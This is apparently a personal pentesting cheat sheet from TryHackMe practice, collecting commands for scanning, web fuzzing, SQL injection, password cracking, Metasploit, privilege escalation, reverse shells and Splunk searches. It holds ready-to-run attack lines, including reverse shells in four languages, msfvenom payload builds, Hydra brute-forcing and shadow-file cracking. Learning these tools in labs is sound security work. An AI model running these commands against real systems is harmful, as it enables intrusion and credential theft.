# 🛡️ Cybersecurity & Pentesting Cheat Sheets

A practical, copy-paste-ready reference for common security tools — built while grinding through TryHackMe rooms and home labs. Grouped per tool, focused on the commands you actually use.

> ⚠️ **For authorized testing and learning only.** Use these tools exclusively on systems you own or have explicit written permission to test. Unauthorized access is illegal.

---

## 📑 Table of Contents

- [Recon & Scanning — Nmap](#-recon--scanning--nmap)
- [Packet Analysis — tcpdump & Wireshark](#-packet-analysis--tcpdump--wireshark)
- [IDS / IPS — Snort](#-ids--ips--snort)
- [Web Enumeration — Gobuster & ffuf](#-web-enumeration--gobuster--ffuf)
- [Web Exploitation — sqlmap & Burp Suite](#-web-exploitation--sqlmap--burp-suite)
- [Password Attacks — Hydra, John, Hashcat](#-password-attacks--hydra-john-hashcat)
- [SMB / Service Enumeration — enum4linux, smbclient, netcat](#-smb--service-enumeration--enum4linux-smbclient-netcat)
- [Exploitation — Metasploit & searchsploit](#-exploitation--metasploit--searchsploit)
- [Privilege Escalation — Basics](#-privilege-escalation--basics)
- [Reverse Shells — Quick Reference](#-reverse-shells--quick-reference)
- [Blue Team — Splunk SPL](#-blue-team--splunk-spl)

---

## 🔍 Recon & Scanning — Nmap

The Network Mapper. First tool on almost every box.

```bash
# Basic scan (top 1000 TCP ports)
nmap 10.10.10.1

# Ping sweep — discover live hosts on a subnet
nmap -sn 10.10.10.0/24

# SYN "stealth" scan (needs root)
sudo nmap -sS 10.10.10.1

# Service/version detection
nmap -sV 10.10.10.1

# OS detection
sudo nmap -O 10.10.10.1

# Aggressive: -sV -O -sC --traceroute combined
nmap -A 10.10.10.1

# Scan ALL 65535 ports
nmap -p- 10.10.10.1

# Specific ports
nmap -p 22,80,443 10.10.10.1

# UDP scan (slow)
sudo nmap -sU 10.10.10.1

# Run default safe NSE scripts
nmap -sC 10.10.10.1

# Run a specific NSE script
nmap --script http-title 10.10.10.1

# Vuln scan
nmap --script vuln 10.10.10.1

# Skip host discovery (target "blocks ping")
nmap -Pn 10.10.10.1

# Speed it up
nmap -T4 10.10.10.1

# Save output (normal / all formats / grepable)
nmap -oN scan.txt 10.10.10.1
nmap -oA scan 10.10.10.1
```

**Common flags:** `-sS` SYN · `-sT` connect · `-sU` UDP · `-sV` version · `-O` OS · `-sC` default scripts · `-p-` all ports · `-Pn` no ping · `-T0..T5` timing · `-oA` save all formats

---

## 📡 Packet Analysis — tcpdump & Wireshark

### tcpdump (CLI capture)

```bash
# Capture on an interface
sudo tcpdump -i eth0

# No name/port resolution (faster, cleaner)
sudo tcpdump -i eth0 -nn

# Write to a pcap file
sudo tcpdump -i eth0 -w capture.pcap

# Read a pcap file back
tcpdump -r capture.pcap

# Filter by host
sudo tcpdump -i eth0 host 10.10.10.1

# Filter by port
sudo tcpdump -i eth0 port 80

# Print packet contents as ASCII
sudo tcpdump -i eth0 -A

# Combine filters
sudo tcpdump -i eth0 'tcp port 80 and host 10.10.10.1'
```

### Wireshark — Display Filters

Type these in the filter bar (display filters, not capture filters):

```text
ip.addr == 10.10.10.1            # any traffic to/from host
ip.src == 10.10.10.1             # source only
ip.dst == 10.10.10.1             # destination only
tcp.port == 80                   # TCP port 80 either direction
http                             # HTTP only
dns                              # DNS only
http.request.method == "POST"    # POST requests
tcp.flags.syn == 1               # SYN packets (scan detection)
tcp.flags.reset == 1             # RST packets
frame contains "password"        # raw string match in packet
tcp.stream eq 0                  # follow a specific stream
```

> 💡 **Right-click a packet → Follow → TCP Stream** to reconstruct a full conversation (great for grabbing creds sent in cleartext).

---

## 🚨 IDS / IPS — Snort

Intrusion detection/prevention. Three modes: sniffer, packet logger, NIDS.

```bash
# Check version / verify install
snort -V

# --- Sniffer mode ---
sudo snort -i eth0 -v        # verbose (TCP/IP headers)
sudo snort -i eth0 -d        # + packet data (payload)
sudo snort -i eth0 -e        # + data-link layer headers
sudo snort -i eth0 -X        # full packet from link layer up

# --- Packet logger mode ---
sudo snort -i eth0 -l ./logs        # log to directory (binary)
sudo snort -i eth0 -K ASCII -l ./logs   # log in ASCII

# --- NIDS mode (with rules/config) ---
sudo snort -c /etc/snort/snort.conf -i eth0
sudo snort -c /etc/snort/snort.conf -A console -i eth0   # alerts to console
sudo snort -c /etc/snort/snort.conf -A fast -i eth0      # fast alert format

# Read & analyse a pcap with your ruleset
sudo snort -c /etc/snort/snort.conf -r capture.pcap -A console

# Test the configuration without running
sudo snort -T -c /etc/snort/snort.conf

# Quiet mode (suppress banner/stats)
sudo snort -q -c /etc/snort/snort.conf -A console -i eth0
```

**Rule structure:**

```text
action protocol src_ip src_port -> dst_ip dst_port (options)

# Example: alert on any inbound traffic to port 80
alert tcp any any -> any 80 (msg:"HTTP traffic detected"; sid:1000001; rev:1;)

# Example: detect a string in payload
alert tcp any any -> any any (msg:"Found password"; content:"password"; sid:1000002; rev:1;)
```

**Common options:** `msg:` alert text · `content:` payload match · `sid:` rule ID (>1,000,000 for local) · `rev:` revision · `nocase;` case-insensitive · `flags:S;` match TCP flags

---

## 🌐 Web Enumeration — Gobuster & ffuf

### Gobuster

```bash
# Directory/file brute-force
gobuster dir -u http://10.10.10.1 -w /usr/share/wordlists/dirb/common.txt

# With file extensions
gobuster dir -u http://10.10.10.1 -w wordlist.txt -x php,txt,html

# More threads
gobuster dir -u http://10.10.10.1 -w wordlist.txt -t 50

# DNS subdomain enumeration
gobuster dns -d example.com -w subdomains.txt

# Virtual host (vhost) discovery
gobuster vhost -u http://10.10.10.1 -w subdomains.txt
```

### ffuf (fast fuzzer)

```bash
# Directory fuzzing — FUZZ marks the injection point
ffuf -u http://10.10.10.1/FUZZ -w wordlist.txt

# With extensions
ffuf -u http://10.10.10.1/FUZZ -w wordlist.txt -e .php,.html,.txt

# vhost fuzzing
ffuf -u http://10.10.10.1 -H "Host: FUZZ.example.com" -w subdomains.txt

# Filter out 404s, match only 200
ffuf -u http://10.10.10.1/FUZZ -w wordlist.txt -mc 200
ffuf -u http://10.10.10.1/FUZZ -w wordlist.txt -fc 404

# Filter by response size (kill noise)
ffuf -u http://10.10.10.1/FUZZ -w wordlist.txt -fs 1234
```

**Common wordlists:** `/usr/share/wordlists/dirb/common.txt` · `/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt`

---

## 💉 Web Exploitation — sqlmap & Burp Suite

### sqlmap (automated SQL injection)

```bash
# Test a GET parameter
sqlmap -u "http://10.10.10.1/page.php?id=1"

# Enumerate databases
sqlmap -u "http://10.10.10.1/page.php?id=1" --dbs

# Tables in a database
sqlmap -u "http://10.10.10.1/page.php?id=1" -D dbname --tables

# Columns in a table
sqlmap -u "http://10.10.10.1/page.php?id=1" -D dbname -T users --columns

# Dump data
sqlmap -u "http://10.10.10.1/page.php?id=1" -D dbname -T users --dump

# POST data
sqlmap -u "http://10.10.10.1/login.php" --data="user=admin&pass=123"

# Use a saved Burp request file
sqlmap -r request.txt

# With a cookie / session
sqlmap -u "http://10.10.10.1/page.php?id=1" --cookie="PHPSESSID=abc123"

# Less prompts, more aggressive
sqlmap -u "..." --batch --level=5 --risk=3

# Quick wins
sqlmap -u "..." --current-user --current-db --is-dba
```

### Burp Suite (workflow notes)

- Set browser proxy to `127.0.0.1:8080`, install Burp's CA cert.
- **Proxy → Intercept** to catch/modify requests live.
- **Repeater** (`Ctrl+R` to send a request there) for manual tweaking.
- **Intruder** for fuzzing/brute-forcing parameters.
- Right-click a request → **Save item** → feed it to sqlmap with `-r`.

---

## 🔑 Password Attacks — Hydra, John, Hashcat

### Hydra (online brute-force)

```bash
# SSH — single user, password list
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.1

# FTP — user list + password list
hydra -L users.txt -P pass.txt ftp://10.10.10.1

# Non-standard port
hydra -l user -P pass.txt -s 2222 ssh://10.10.10.1

# HTTP POST login form
#   format: "<path>:<post-body>:<failure-string>"
hydra -l admin -P rockyou.txt 10.10.10.1 http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"

# Useful flags: -t tasks  -f stop on first hit  -V verbose
hydra -l admin -P rockyou.txt -t 4 -f -V ssh://10.10.10.1
```

**Protocols:** `ssh` `ftp` `rdp` `smb` `mysql` `http-get` `http-post-form`

### John the Ripper (offline cracking)

```bash
# Auto-detect format with a wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Show cracked passwords
john --show hash.txt

# Force a hash format
john --format=raw-md5 --wordlist=rockyou.txt hash.txt

# Combine /etc/passwd + /etc/shadow, then crack
unshadow /etc/passwd /etc/shadow > hashes.txt
john hashes.txt

# Crack other file types (convert first)
zip2john secret.zip > zip.hash
ssh2john id_rsa > rsa.hash
rar2john file.rar > rar.hash

# Apply mangling rules
john --wordlist=rockyou.txt --rules hash.txt
```

### Hashcat (GPU cracking)

```bash
# Straight attack (-a 0) against MD5 (-m 0)
hashcat -m 0 -a 0 hash.txt rockyou.txt

# Show cracked
hashcat -m 0 hash.txt --show

# Mask / brute-force attack (-a 3)
hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a
```

**Common modes (`-m`):** `0` MD5 · `100` SHA1 · `1000` NTLM · `1800` sha512crypt · `3200` bcrypt · `22000` WPA-PBKDF2
**Mask charsets:** `?l` a-z · `?u` A-Z · `?d` 0-9 · `?s` symbols · `?a` all

---

## 🗂️ SMB / Service Enumeration — enum4linux, smbclient, netcat

```bash
# enum4linux — full enumeration of an SMB host
enum4linux -a 10.10.10.1
enum4linux -U 10.10.10.1     # users only
enum4linux -S 10.10.10.1     # shares only

# smbclient — list shares (null session)
smbclient -L //10.10.10.1 -N

# Connect to a share
smbclient //10.10.10.1/share -N            # no password
smbclient //10.10.10.1/share -U username    # with user

# netcat — listener (catch a reverse shell)
nc -lvnp 4444

# netcat — connect / banner grab
nc 10.10.10.1 80
nc 10.10.10.1 22

# netcat — file transfer
nc -lvnp 4444 > received.file     # receiver
nc 10.10.10.1 4444 < send.file    # sender
```

---

## 💥 Exploitation — Metasploit & searchsploit

### Metasploit Framework

```bash
# Launch the console
msfconsole

# Search for a module
search ms17-010

# Select a module
use exploit/windows/smb/ms17_010_eternalblue

# Show & set options
show options
set RHOSTS 10.10.10.1
set LHOST tun0
set LPORT 4444

# Always set the FULL payload name (not the menu number)
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Fire
exploit        # or: run
```

**Meterpreter post-exploitation:**

```bash
sysinfo            # target info
getuid             # current user
hashdump           # dump password hashes
shell              # drop to a system shell
background         # background the session
sessions           # list sessions
sessions -i 1      # interact with session 1
upload file /path  # upload a file
download file      # grab a file
```

**msfvenom (payload generation):**

```bash
# Windows reverse shell EXE
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f exe -o shell.exe

# Linux ELF
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f elf -o shell.elf

# PHP web shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f raw -o shell.php

# List payloads / formats
msfvenom --list payloads
msfvenom --list formats
```

### searchsploit (Exploit-DB CLI)

```bash
searchsploit apache 2.4          # search
searchsploit -m 12345            # copy exploit to current dir (-m = mirror)
searchsploit -x 12345            # examine the exploit file
```

---

## ⬆️ Privilege Escalation — Basics

```bash
# --- Linux ---
sudo -l                                    # what can I run as sudo?
find / -perm -4000 2>/dev/null             # find SUID binaries
cat /etc/crontab                           # scheduled tasks
uname -a                                   # kernel version (kernel exploits)
id                                         # current groups/uid

# Automated enumeration scripts
./linpeas.sh
./linenum.sh

# --- Windows ---
whoami /priv                               # current privileges
systeminfo                                 # OS / patch level
.\winPEAS.exe                              # automated enum
```

> 💡 Cross-reference findings on **GTFOBins** (Linux) and **LOLBAS** (Windows) for abusable binaries.

---

## 🐚 Reverse Shells — Quick Reference

Start a listener first: `nc -lvnp 4444`

```bash
# Bash
bash -i >& /dev/tcp/10.10.10.1/4444 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.10.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'

# Netcat (if -e supported)
nc -e /bin/bash 10.10.10.1 4444

# PHP
php -r '$sock=fsockopen("10.10.10.1",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
```

**Stabilise a shell:**
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# then: Ctrl+Z  →  stty raw -echo; fg  →  Enter  →  export TERM=xterm
```

> 💡 [revshells.com](https://www.revshells.com) generates these for any IP/port/language.

---

## 🔵 Blue Team — Splunk SPL

Search Processing Language basics for SOC work.

```text
# Basic search
index=main sourcetype=access_combined

# Count by field
index=main | stats count by src_ip

# Top / rare values
index=main | top 10 url
index=main | rare user

# Table specific fields
index=main | table _time, src_ip, action

# Sort
index=main | stats count by src_ip | sort -count

# Remove duplicates
index=main | dedup user

# Filter results
index=main | where bytes > 10000

# Extract a field on the fly with regex
index=main | rex field=_raw "user=(?<username>\w+)"
```

> ⚠️ **On lab VMs:** if Splunk doesn't auto-start, launch it manually. And set the time picker to **"All time"** — otherwise you'll miss historical events and think a search returned nothing.

---

## 📚 Resources

- [TryHackMe](https://tryhackme.com) — guided rooms & labs
- [GTFOBins](https://gtfobins.github.io) / [LOLBAS](https://lolbas-project.github.io) — privesc binaries
- [revshells.com](https://www.revshells.com) — reverse shell generator
- [SecLists](https://github.com/danielmiessler/SecLists) — wordlists
- [HackTricks](https://book.hacktricks.xyz) — methodology reference

---

*Maintained as a personal study reference. Contributions & corrections welcome.*
